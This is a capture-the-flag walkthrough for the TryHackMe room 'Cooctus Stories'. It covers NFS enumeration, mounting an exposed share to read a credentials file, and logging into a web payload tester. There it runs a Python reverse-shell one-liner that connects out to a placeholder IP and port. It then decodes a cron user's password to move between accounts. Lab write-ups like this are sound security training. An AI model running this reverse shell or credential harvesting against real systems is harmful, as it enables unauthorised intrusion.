# Cooctus Stories

![image](https://user-images.githubusercontent.com/5285547/137158401-c5ca65f3-6911-4fc2-b8ca-6e6fa75d9cd8.png)

Room link: https://tryhackme.com/room/cooctusadventures


## Enumeration

Nmap 

```
PORT      STATE SERVICE  VERSION
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs_acl  3 (RPC #100227)
33785/tcp open  mountd   1-3 (RPC #100005)
35851/tcp open  mountd   1-3 (RPC #100005)
41045/tcp open  nlockmgr 1-4 (RPC #100021)
50903/tcp open  mountd   1-3 (RPC #100005)
```

NFS (port 111)

```
rpcinfo 10.10.45.119 

program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100005    1    udp       0.0.0.0.191.125        mountd     superuser
    100005    1    tcp       0.0.0.0.131.249        mountd     superuser
    100005    1    udp6      ::.180.191             mountd     superuser
    100005    1    tcp6      ::.226.123             mountd     superuser
    100005    2    udp       0.0.0.0.207.251        mountd     superuser
    100005    2    tcp       0.0.0.0.198.215        mountd     superuser
    100005    2    udp6      ::.188.15              mountd     superuser
    100005    2    tcp6      ::.151.105             mountd     superuser
    100005    3    udp       0.0.0.0.228.147        mountd     superuser
    100005    3    tcp       0.0.0.0.140.11         mountd     superuser
    100005    3    udp6      ::.224.137             mountd     superuser
    100005    3    tcp6      ::.234.227             mountd     superuser
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            -          superuser
    100003    3    udp       0.0.0.0.8.1            nfs        superuser
    100227    3    udp       0.0.0.0.8.1            -          superuser
    100003    3    tcp6      ::.8.1                 nfs        superuser
    100003    4    tcp6      ::.8.1                 nfs        superuser
    100227    3    tcp6      ::.8.1                 -          superuser
    100003    3    udp6      ::.8.1                 nfs        superuser
    100227    3    udp6      ::.8.1                 -          superuser
    100021    1    udp       0.0.0.0.186.205        nlockmgr   superuser
    100021    3    udp       0.0.0.0.186.205        nlockmgr   superuser
    100021    4    udp       0.0.0.0.186.205        nlockmgr   superuser
    100021    1    tcp       0.0.0.0.160.85         nlockmgr   superuser
    100021    3    tcp       0.0.0.0.160.85         nlockmgr   superuser
    100021    4    tcp       0.0.0.0.160.85         nlockmgr   superuser
    100021    1    udp6      ::.231.97              nlockmgr   superuser
    100021    3    udp6      ::.231.97              nlockmgr   superuser
    100021    4    udp6      ::.231.97              nlockmgr   superuser
    100021    1    tcp6      ::.168.99              nlockmgr   superuser
    100021    3    tcp6      ::.168.99              nlockmgr   superuser
    100021    4    tcp6      ::.168.99              nlockmgr   superuser
```

NFS (Port 2049)

Source: https://book.hacktricks.xyz/pentesting/nfs-service-pentesting

```
showmount -e  10.10.45.119

Export list for 10.10.45.119:
/var/nfs/general *
```

So we see we maybe able mount the nfs share. 

```
mkdir /mnt/new_back
sudo mount -t nfs 10.10.45.119:/var/nfs/general /mnt/new_back -o nolock
```

```
ls /mnt/new_back
credentials.bak

cat credentials.bak 
paradoxial.test
ShibaPretzel79
```

## Port 8080

http://10.10.45.119:8080/

http://10.10.45.119:8080/login (found using ffuf)

After loggin in with the above creds found. We can test some commands in the payload tester.. 

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![image](https://user-images.githubusercontent.com/5285547/137162702-85679986-63d1-4bf9-8714-7e6cd5404a46.png)

Now we can get our first flag and start on enumeration again.. 


## User 2

From the crontabs we can see a file running every minuet by szymex

```bash
* *     * * *   szymex  /home/szymex/SniffingCat.py
```

Looking at the script we can edit it to get the password for the encrypted password. 

```
#!/usr/bin/python3

import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc

line = "pureelpbxr"
enc_pw = encode(line)
print(enc_pw)
```

With the new password we can login as syzmex and get his flag! 

```
su syzmex
cherrycoke
```

## User 3


